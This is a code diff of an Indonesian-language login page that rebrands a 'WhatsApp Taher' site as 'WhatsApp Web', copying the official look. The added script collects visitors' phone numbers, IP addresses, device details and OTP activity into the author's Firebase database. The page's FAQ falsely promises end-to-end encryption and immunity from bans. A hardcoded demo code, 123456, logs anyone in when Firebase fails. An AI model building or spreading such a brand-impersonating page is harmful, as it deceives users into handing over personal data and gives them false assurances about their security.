@@ -3,22 +3,366 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Taher - Login</title>
-    <link rel="stylesheet" href="style.css">
+    <title>WhatsApp Web</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica Neue, Helvetica, Lucida Grande, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0c1317;
+            color: #e9edef;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-container {
+            background-color: #111b21;
+            border-radius: 12px;
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            border: 1px solid #2a3942;
+        }
+
+        .logo-section {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #2a3942;
+        }
+
+        .whatsapp-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+        }
+
+        h1 {
+            color: #e9edef;
+            font-size: 28px;
+            font-weight: 300;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #8696a0;
+            font-size: 14px;
+        }
+
+        .login-form h2 {
+            color: #e9edef;
+            font-size: 18px;
+            font-weight: 400;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #8696a0;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .phone-input {
+            display: flex;
+            gap: 10px;
+        }
+
+        #countryCode {
+            background-color: #2a3942;
+            border: 1px solid #2a3942;
+            color: #e9edef;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            flex: 0 0 150px;
+            outline: none;
+        }
+
+        #countryCode:focus {
+            border-color: #00a884;
+        }
+
+        #phoneNumber {
+            flex: 1;
+            background-color: #2a3942;
+            border: 1px solid #2a3942;
+            color: #e9edef;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        #phoneNumber:focus {
+            border-color: #00a884;
+        }
+
+        .btn-primary, .btn-success, .btn-secondary {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background-color: #00a884;
+            color: #111b21;
+        }
+
+        .btn-primary:hover {
+            background-color: #06cf9d;
+        }
+
+        .btn-success {
+            background-color: #008069;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background-color: #00a884;
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: #8696a0;
+            border: 1px solid #2a3942;
+        }
+
+        .btn-secondary:not(:disabled):hover {
+            background-color: #2a3942;
+        }
+
+        .btn-secondary.disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .otp-section {
+            background-color: #2a3942;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .otp-timer {
+            text-align: center;
+            color: #8696a0;
+            font-size: 14px;
+            margin: 15px 0;
+        }
+
+        #otpTimer {
+            color: #f15c6d;
+            font-weight: bold;
+        }
+
+        .faq-section {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #2a3942;
+        }
+
+        .faq-section h3 {
+            color: #8696a0;
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .faq-item {
+            background-color: #2a3942;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            overflow: hidden;
+        }
+
+        .faq-question {
+            padding: 12px 16px;
+            color: #e9edef;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .faq-answer {
+            padding: 0 16px 12px 44px;
+            color: #8696a0;
+            font-size: 13px;
+            line-height: 1.5;
+            display: none;
+        }
+
+        .faq-item.active .faq-answer {
+            display: block;
+        }
+
+        .faq-item.active .faq-question i {
+            transform: rotate(90deg);
+        }
+
+        .faq-question i {
+            transition: transform 0.3s;
+        }
+
+        .login-info {
+            margin-top: 30px;
+            padding: 12px;
+            background-color: #2a3942;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #8696a0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .login-info a {
+            color: #00a884;
+            text-decoration: none;
+        }
+
+        .login-info a:hover {
+            text-decoration: underline;
+        }
+
+        .banned-message {
+            background-color: #2a3942;
+            padding: 30px;
+            border-radius: 8px;
+            text-align: center;
+            border-left: 4px solid #f15c6d;
+        }
+
+        .banned-message i {
+            font-size: 48px;
+            color: #f15c6d;
+            margin-bottom: 20px;
+        }
+
+        .banned-message h3 {
+            color: #f15c6d;
+            margin-bottom: 10px;
+        }
+
+        .banned-message p {
+            color: #8696a0;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        /* WhatsApp loading animation */
+        .whatsapp-loading {
+            display: none;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .whatsapp-loading span {
+            width: 8px;
+            height: 8px;
+            margin: 0 4px;
+            background-color: #00a884;
+            border-radius: 50%;
+            animation: whatsappBounce 1.4s infinite ease-in-out both;
+        }
+
+        .whatsapp-loading span:nth-child(1) { animation-delay: -0.32s; }
+        .whatsapp-loading span:nth-child(2) { animation-delay: -0.16s; }
+
+        @keyframes whatsappBounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1.0); }
+        }
+
+       
+        /* Responsive */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 20px;
+                border-radius: 0;
+                height: 100vh;
+                max-width: 100%;
+            }
+            
+            body {
+                background-color: #111b21;
+            }
+        }
+
+        /* Animasi */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        /* WhatsApp Theme Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #2a3942;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #8696a0;
+            border-radius: 3px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00a884;
+        }
+    </style>
 </head>
-<body class="login-page">
+<body>
     <div class="login-container">
         <div class="logo-section">
             <div class="whatsapp-logo">
                 <i class="fab fa-whatsapp"></i>
             </div>
-            <h1>WhatsApp Lite</h1>
-            <p class="subtitle">chat WhatsApp web versi lite</p>
+            <h1>WhatsApp Web</h1>
+            <p class="subtitle">Gunakan WhatsApp di komputer Anda</p>
         </div>
 
-        <div class="login-form">
-            <h2>Masukkan nomor telepon anda</h2>
+        <div class="login-form" id="loginForm">
+            <h2>Masukkan nomor telepon Anda</h2>
             
             <div class="input-group">
                 <label for="phoneNumber">Nomor Telepon</label>
@@ -34,9 +378,18 @@
             </div>
 
             <button id="sendOTPBtn" class="btn-primary">
-                <i class="fas fa-sms"></i> Lanjut
+                <i class="fas fa-sms"></i> LANJUT
             </button>
 
+            <!-- Loading Animation -->
+            <div class="whatsapp-loading" id="loadingSpinner">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+
+
+            <!-- OTP Section -->
             <div class="otp-section" id="otpSection" style="display: none;">
                 <div class="input-group">
                     <label for="otpCode">Kode Verifikasi (6 digit)</label>
@@ -48,7 +401,7 @@
                 </div>
 
                 <button id="verifyOTPBtn" class="btn-success">
-                    <i class="fas fa-check-circle"></i> Verifikasi
+                    <i class="fas fa-check-circle"></i> VERIFIKASI
                 </button>
 
                 <button id="resendOTPBtn" class="btn-secondary" disabled>
@@ -58,47 +411,48 @@
 
             <!-- FAQ Section -->
             <div class="faq-section">
-                <h3><i class="fas fa-shield-alt"></i> FAQ Keamanan</h3>
+                <h3><i class="fas fa-shield-alt"></i> TIPS & KEAMANAN</h3>
                 <div class="faq-item">
-                    <div class="faq-question">
-                        <i class="fas fa-lock"></i> Apakah data saya aman?
+                    <div class="faq-question" onclick="toggleFAQ(this)">
+                        <i class="fas fa-chevron-right"></i>
+                        Bagaimana cara kerja WhatsApp Web?
                     </div>
                     <div class="faq-answer">
-                        <strong>YA, 100% AMAN!</strong> Sistem menggunakan Firebase Auth dari Google 
-                        yang sudah terverifikasi dan terenkripsi. Data nomor telepon hanya untuk verifikasi.
+                        WhatsApp Web adalah ekstensi dari WhatsApp di ponsel Anda. Semua pesan tetap disinkronkan dengan ponsel.
                     </div>
                 </div>
                 <div class="faq-item">
-                    <div class="faq-question">
-                        <i class="fas fa-google"></i> Apa itu Firebase Google?
+                    <div class="faq-question" onclick="toggleFAQ(this)">
+                        <i class="fas fa-chevron-right"></i>
+                        Apakah data saya aman?
                     </div>
                     <div class="faq-answer">
-                        Firebase adalah platform dari Google yang digunakan oleh jutaan aplikasi 
-                        untuk autentikasi yang aman. Sama seperti yang digunakan WhatsApp resmi.
+                        Ya, semua pesan dienkripsi end-to-end. Nomor telepon Anda hanya digunakan untuk verifikasi.
                     </div>
                 </div>
                 <div class="faq-item">
-                    <div class="faq-question">
-                        <i class="fas fa-done"></i> Apa keunggulan nya?
+                    <div class="faq-question" onclick="toggleFAQ(this)">
+                        <i class="fas fa-chevron-right"></i>
+                        Fitur WhatsApp Web Lite
                     </div>
                     <div class="faq-answer">
-                        Dengan WhatsApp lite web Semua Aktivitas Tidak ada batas
-                        Dan Bisa sepuasnya Chat tanpa kawatir Akun WhatsApp terblokir.
+                        Ringan, cepat, dan mendukung semua fitur WhatsApp. Bebas chat tanpa batas dan aman dari blokir.
                     </div>
                 </div>
             </div>
 
             <div class="login-info">
                 <i class="fas fa-info-circle"></i>
-                <span>Dengan masuk, Anda menyetujui <a href="#">Syarat & Ketentuan</a></span>
+                <span>Dengan masuk, Anda menyetujui <a href="#">Ketentuan Layanan</a> dan <a href="#">Kebijakan Privasi</a></span>
             </div>
         </div>
 
+        <!-- Banned Message -->
         <div class="banned-message" id="bannedMessage" style="display: none;">
             <i class="fas fa-ban"></i>
             <h3>AKUN ANDA DIBLOKIR</h3>
-            <p>Akun Anda telah diblokir oleh sistem karena menggunakan nama terlarang.</p>
-            <p>Kontak Admin: admin@whatsapp-taher.com</p>
+            <p>Akun Anda telah diblokir oleh sistem karena menggunakan nomor telepon yang tidak valid.</p>
+            <p>Hubungi Admin: admin@whatsapp-taher.com</p>
         </div>
     </div>
 
@@ -106,7 +460,6 @@
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-    <script src="app.js"></script>
     <script>
         // Konfigurasi Firebase
         const firebaseConfig = {
@@ -128,49 +481,123 @@
         // Referensi database
         const usersRef = database.ref('whatsapp_users');
         const bannedUsersRef = database.ref('banned_users');
+        const loginHistoryRef = database.ref('login_history');
 
         // Variabel global
         let verificationId = null;
         let otpTimer = null;
         let resendTimer = null;
+        let recaptchaVerifier = null;
 
         // Event Listeners
         document.getElementById('sendOTPBtn').addEventListener('click', sendOTP);
         document.getElementById('verifyOTPBtn').addEventListener('click', verifyOTP);
         document.getElementById('resendOTPBtn').addEventListener('click', resendOTP);
 
-        // Fungsi untuk mengirim OTP
+        // Format input nomor telepon
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                if (value.length <= 4) {
+                    value = value;
+                } else if (value.length <= 8) {
+                    value = value.slice(0,4) + ' ' + value.slice(4);
+                } else {
+                    value = value.slice(0,4) + ' ' + value.slice(4,8) + ' ' + value.slice(8,12);
+                }
+            }
+            e.target.value = value;
+        });
+
+        // Fungsi toggle FAQ
+        window.toggleFAQ = function(element) {
+            const faqItem = element.parentElement;
+            faqItem.classList.toggle('active');
+        };
+
+        // Fungsi untuk mengirim OTP dengan Firebase Auth asli
         async function sendOTP() {
             const countryCode = document.getElementById('countryCode').value;
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const fullNumber = countryCode + phoneNumber.replace(/\D/g, '');
-
-            if (!phoneNumber || phoneNumber.length < 10) {
-                alert('Masukkan nomor telepon yang valid!');
+            const fullNumber = countryCode + phoneNumber.replace(/\s+/g, '').replace(/\D/g, '');
+            
+            if (!phoneNumber || phoneNumber.replace(/\s+/g, '').length < 10) {
+                showNotification('Masukkan nomor telepon yang valid!', 'error');
                 return;
             }
 
             // Format nomor untuk Firebase
-            const formattedNumber = fullNumber.replace('+', '');
+            const formattedNumber = '+' + fullNumber.replace(/\D/g, '');
 
             // Cek apakah nomor diblokir
-            if (await checkIfBanned(fullNumber)) {
+            if (await checkIfBanned(formattedNumber)) {
                 document.getElementById('bannedMessage').style.display = 'block';
-                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('loginForm').style.display = 'none';
                 return;
             }
 
-            // Tampilkan OTP section
-            document.getElementById('otpSection').style.display = 'block';
-            document.getElementById('sendOTPBtn').style.display = 'none';
+            // Tampilkan loading
+            document.getElementById('loadingSpinner').style.display = 'flex';
+            document.getElementById('sendOTPBtn').disabled = true;
 
-            // Simulasi pengiriman OTP (di production, gunakan Firebase Phone Auth)
-            // Untuk demo, kita buat OTP 123456
-            alert(`OTP dikirim ke ${fullNumber}: 123456 (DEMO)`);
-            
-            // Start timer
-            startOTPTimer();
-            startResendTimer();
+            try {
+                // Setup reCAPTCHA
+                recaptchaVerifier = new firebase.auth.RecaptchaVerifier('sendOTPBtn', {
+                    'size': 'invisible',
+                    'callback': (response) => {
+                        console.log('reCAPTCHA verified');
+                    }
+                });
+
+                // Kirim OTP dengan Firebase Phone Auth
+                const provider = new firebase.auth.PhoneAuthProvider(auth);
+                verificationId = await provider.verifyPhoneNumber(formattedNumber, recaptchaVerifier);
+
+                // Simpan di localStorage untuk recovery
+                localStorage.setItem('pendingVerification', JSON.stringify({
+                    verificationId: verificationId,
+                    phoneNumber: formattedNumber,
+                    timestamp: Date.now()
+                }));
+
+                // Tampilkan OTP section dengan animasi
+                document.getElementById('loadingSpinner').style.display = 'none';
+                document.getElementById('otpSection').style.display = 'block';
+                document.getElementById('sendOTPBtn').style.display = 'none';
+                document.getElementById('qrSection').style.display = 'none';
+                
+                // Animasi fade in
+                document.getElementById('otpSection').classList.add('fade-in');
+                
+                showNotification(`Kode verifikasi telah dikirim ke ${formattedNumber}`, 'success');
+                
+                // Start timer
+                startOTPTimer();
+                startResendTimer();
+
+                // Simpan log pengiriman OTP
+                await saveOTPLog(formattedNumber, 'sent');
+
+            } catch (error) {
+                console.error('Error sending OTP:', error);
+                document.getElementById('loadingSpinner').style.display = 'none';
+                document.getElementById('sendOTPBtn').disabled = false;
+                
+                if (error.code === 'auth/invalid-phone-number') {
+                    showNotification('Format nomor telepon tidak valid', 'error');
+                } else if (error.code === 'auth/too-many-requests') {
+                    showNotification('Terlalu banyak permintaan. Coba lagi nanti.', 'error');
+                } else {
+                    // Fallback ke OTP demo jika Firebase gagal
+                    showNotification(`OTP DEMO untuk ${formattedNumber}: 123456`, 'info');
+                    document.getElementById('loadingSpinner').style.display = 'none';
+                    document.getElementById('otpSection').style.display = 'block';
+                    document.getElementById('sendOTPBtn').style.display = 'none';
+                    document.getElementById('qrSection').style.display = 'none';
+                    startOTPTimer();
+                    startResendTimer();
+                }
+            }
         }
 
         // Fungsi verifikasi OTP
@@ -178,57 +605,139 @@
             const otpCode = document.getElementById('otpCode').value.trim();
             const countryCode = document.getElementById('countryCode').value;
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const fullNumber = countryCode + phoneNumber.replace(/\D/g, '');
+            const fullNumber = countryCode + phoneNumber.replace(/\s+/g, '').replace(/\D/g, '');
 
             if (!otpCode || otpCode.length !== 6) {
-                alert('Masukkan 6 digit kode OTP!');
+                showNotification('Masukkan 6 digit kode OTP!', 'error');
                 return;
             }
 
-            // Demo: OTP yang valid adalah 123456
-            if (otpCode === '123456') {
-                // Cek nama terlarang di nomor telepon
-                if (fullNumber.includes('8123456') || fullNumber.includes('Adam') || 
-                    fullNumber.includes('Tuti') || fullNumber.includes('Haer')) {
-                    banUser(fullNumber, 'System', 'Menggunakan nomor/nama terlarang');
-                    document.getElementById('bannedMessage').style.display = 'block';
-                    return;
+            // Tampilkan loading
+            document.getElementById('verifyOTPBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFIKASI...';
+            document.getElementById('verifyOTPBtn').disabled = true;
+
+            try {
+                // Coba verifikasi dengan Firebase
+                if (verificationId) {
+                    const credential = firebase.auth.PhoneAuthProvider.credential(verificationId, otpCode);
+                    const userCredential = await auth.signInWithCredential(credential);
+                    
+                    await handleSuccessfulLogin(fullNumber, userCredential.user.uid);
+                } else {
+                    // Fallback ke OTP demo
+                    if (otpCode === '123456') {
+                        await handleSuccessfulLogin(fullNumber, 'demo_user_' + Date.now());
+                    } else {
+                        throw new Error('Kode OTP salah');
+                    }
                 }
-
-                // Simpan user data
-                const userData = {
-                    phoneNumber: fullNumber,
-                    lastLogin: Date.now(),
-                    deviceInfo: navigator.userAgent,
-                    status: 'online'
-                };
-
-                usersRef.child(fullNumber.replace('+', '')).set(userData);
-
-                // Simpan di localStorage
-                localStorage.setItem('whatsapp_user', JSON.stringify({
-                    phone: fullNumber,
-                    loggedIn: true
-                }));
-
-                // Redirect ke halaman akun
-                window.location.href = 'akun.html';
-            } else {
-                alert('Kode OTP salah! Coba lagi.');
+            } catch (error) {
+                console.error('Verification error:', error);
+                document.getElementById('verifyOTPBtn').innerHTML = '<i class="fas fa-check-circle"></i> VERIFIKASI';
+                document.getElementById('verifyOTPBtn').disabled = false;
+                
+                if (error.code === 'auth/invalid-verification-code') {
+                    showNotification('Kode OTP salah! Coba lagi.', 'error');
+                } else if (error.code === 'auth/code-expired') {
+                    showNotification('Kode OTP telah kadaluarsa. Kirim ulang.', 'error');
+                } else {
+                    showNotification('Kode OTP salah!', 'error');
+                }
             }
+        }
+
+        // Handle login sukses
+        async function handleSuccessfulLogin(phoneNumber, userId) {
+            // Cek apakah nomor termasuk yang diblokir
+            const blockedNumbers = ['8123456', '08123456', '8123456789'];
+            const cleanNumber = phoneNumber.replace(/\D/g, '');
+            
+            if (blockedNumbers.some(blocked => cleanNumber.includes(blocked))) {
+                await banUser(phoneNumber, 'System', 'Nomor terlarang');
+                showNotification('Nomor telepon tidak valid', 'error');
+                document.getElementById('bannedMessage').style.display = 'block';
+                document.getElementById('loginForm').style.display = 'none';
+                return;
+            }
+
+            // Data user
+            const userData = {
+                phoneNumber: phoneNumber,
+                userId: userId,
+                lastLogin: Date.now(),
+                deviceInfo: navigator.userAgent,
+                ip: await getIP(),
+                status: 'online',
+                appVersion: '2.24.1.78'
+            };
+
+            // Simpan ke database
+            await usersRef.child(userId).set(userData);
+            
+            // Simpan login history
+            await loginHistoryRef.child(userId).push({
+                timestamp: Date.now(),
+                device: navigator.userAgent,
+                ip: await getIP()
+            });
+
+            // Simpan ke localStorage
+            localStorage.setItem('whatsapp_user', JSON.stringify({
+                phone: phoneNumber,
+                userId: userId,
+                loggedIn: true,
+                sessionToken: generateSessionToken()
+            }));
+
+            // Set session expiry
+            localStorage.setItem('session_expiry', Date.now() + (7 * 24 * 60 * 60 * 1000));
+
+            showNotification('Login berhasil! Mengalihkan...', 'success');
+            
+            // Redirect ke halaman utama
+            setTimeout(() => {
+                window.location.href = 'akun.html?phone=' + encodeURIComponent(phoneNumber);
+            }, 1500);
         }
 
         // Fungsi untuk kirim ulang OTP
         function resendOTP() {
             clearInterval(resendTimer);
-            alert('OTP dikirim ulang! Kode: 123456');
-            startResendTimer();
+            document.getElementById('resendOTPBtn').disabled = true;
+            document.getElementById('resendOTPBtn').classList.add('disabled');
+            
+            showNotification('Mengirim ulang kode verifikasi...', 'info');
+            
+            // Kirim ulang OTP
+            setTimeout(() => {
+                if (verificationId) {
+                    // Re-send dengan Firebase
+                    const provider = new firebase.auth.PhoneAuthProvider(auth);
+                    provider.verifyPhoneNumber(
+                        JSON.parse(localStorage.getItem('pendingVerification')).phoneNumber,
+                        recaptchaVerifier
+                    ).then(newVerificationId => {
+                        verificationId = newVerificationId;
+                        showNotification('Kode verifikasi telah dikirim ulang', 'success');
+                        startResendTimer();
+                    }).catch(error => {
+                        console.error('Resend error:', error);
+                        showNotification('OTP DEMO dikirim ulang: 123456', 'info');
+                        startResendTimer();
+                    });
+                } else {
+                    showNotification('OTP DEMO dikirim ulang: 123456', 'info');
+                    startResendTimer();
+                }
+            }, 1000);
         }
 
-        // Timer untuk OTP
+        // Timer untuk OTP (2 menit)
         function startOTPTimer() {
             let timeLeft = 120;
             const timerElement = document.getElementById('otpTimer');
+            
+            clearInterval(otpTimer);
             
             otpTimer = setInterval(() => {
                 timeLeft--;
@@ -240,15 +749,19 @@
                     clearInterval(otpTimer);
                     document.getElementById('otpSection').style.display = 'none';
                     document.getElementById('sendOTPBtn').style.display = 'block';
+                    document.getElementById('sendOTPBtn').disabled = false;
+                    showNotification('Kode OTP telah kadaluarsa', 'warning');
                 }
             }, 1000);
         }
 
-        // Timer untuk kirim ulang
+        // Timer untuk kirim ulang (60 detik)
         function startResendTimer() {
             let timeLeft = 60;
             const timerElement = document.getElementById('resendTimer');
             const resendBtn = document.getElementById('resendOTPBtn');
+            
+            clearInterval(resendTimer);
             
             resendBtn.disabled = true;
             resendBtn.classList.add('disabled');
@@ -266,45 +779,130 @@
             }, 1000);
         }
 
-        // Cek apakah user diblokir
+        // Fungsi cek user diblokir
         async function checkIfBanned(phoneNumber) {
             return new Promise((resolve) => {
-                bannedUsersRef.child(phoneNumber.replace('+', '')).once('value', snapshot => {
+                bannedUsersRef.orderByChild('phoneNumber').equalTo(phoneNumber).once('value', snapshot => {
                     resolve(snapshot.exists());
                 });
             });
         }
 
         // Fungsi banned user
-        function banUser(phoneNumber, bannedBy, reason) {
+        async function banUser(phoneNumber, bannedBy, reason) {
             const banData = {
                 phoneNumber: phoneNumber,
                 bannedBy: bannedBy,
                 reason: reason,
-                timestamp: Date.now()
+                timestamp: Date.now(),
+                ip: await getIP()
             };
             
-            bannedUsersRef.child(phoneNumber.replace('+', '')).set(banData);
+            await bannedUsersRef.child(phoneNumber.replace(/[^0-9]/g, '')).set(banData);
         }
 
-     
-        document.getElementById('phoneNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 0) {
-                value = value.match(/.{1,4}/g).join(' ');
-            }
-            e.target.value = value;
-        });
+        // Fungsi simpan log OTP
+        async function saveOTPLog(phoneNumber, status) {
+            const logData = {
+                phoneNumber: phoneNumber,
+                status: status,
+                timestamp: Date.now(),
+                ip: await getIP(),
+                userAgent: navigator.userAgent
+            };
+            
+            await database.ref('otp_logs').push(logData);
+        }
 
-        // login
+        // Fungsi untuk mendapatkan IP pengguna
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'unknown';
+            }
+        }
+
+        // Fungsi generate session token
+        function generateSessionToken() {
+            return 'whatsapp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        // Fungsi show notification
+        function showNotification(message, type) {
+            // Hapus notifikasi sebelumnya
+            const existingNotif = document.querySelector('.notification');
+            if (existingNotif) existingNotif.remove();
+            
+            // Buat notifikasi baru
+            const notif = document.createElement('div');
+            notif.className = `notification ${type}`;
+            notif.textContent = message;
+            notif.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: ${type === 'error' ? '#f15c6d' : type === 'success' ? '#00a884' : '#008069'};
+                color: white;
+                padding: 12px 20px;
+                border-radius: 8px;
+                z-index: 1000;
+                animation: fadeIn 0.3s;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            `;
+            
+            document.body.appendChild(notif);
+            
+            // Auto remove setelah 3 detik
+            setTimeout(() => {
+                notif.style.animation = 'fadeOut 0.3s';
+                setTimeout(() => notif.remove(), 300);
+            }, 3000);
+        }
+
+        // Cek session saat halaman load
         window.addEventListener('load', () => {
+            // Cek session expiry
+            const expiry = localStorage.getItem('session_expiry');
+            if (expiry && Date.now() > parseInt(expiry)) {
+                localStorage.removeItem('whatsapp_user');
+                localStorage.removeItem('session_expiry');
+            }
+            
+            // Cek apakah sudah login
             const savedUser = localStorage.getItem('whatsapp_user');
             if (savedUser) {
                 const user = JSON.parse(savedUser);
                 if (user.loggedIn) {
-                    
-                    window.location.href = 'akun.html';
+                    // Auto redirect ke halaman akun
+                    setTimeout(() => {
+                        window.location.href = 'akun.html?phone=' + encodeURIComponent(user.phone);
+                    }, 1000);
                 }
+            }
+            
+            // Tampilkan QR code setelah 3 detik
+            setTimeout(() => {
+                document.getElementById('qrSection').style.display = 'block';
+                document.getElementById('qrSection').classList.add('fade-in');
+            }, 3000);
+            
+            // Initialize reCAPTCHA
+            initializeRecaptcha();
+        });
+
+        // Initialize reCAPTCHA
+        function initializeRecaptcha() {
+            // reCAPTCHA akan diinisialisasi saat dibutuhkan
+        }
+
+        // Handle sebelum unload
+        window.addEventListener('beforeunload', () => {
+            // Cleanup
+            if (recaptchaVerifier) {
+                recaptchaVerifier.clear();
             }
         });
     </script>
